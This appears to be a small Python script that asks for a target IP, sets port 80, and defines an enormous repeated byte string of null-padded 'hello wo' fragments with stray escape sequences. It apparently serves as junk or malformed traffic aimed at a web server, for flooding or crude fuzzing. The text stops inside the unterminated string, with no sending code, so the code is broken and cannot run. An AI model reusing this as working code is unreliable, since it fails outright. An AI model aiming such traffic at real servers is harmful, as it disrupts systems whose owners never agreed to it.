import time
import socket
TCP_IP = str(input("ip is:"))
TCP_PORT = 80
BUFFER_SIZE = 1024
mystring = "\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 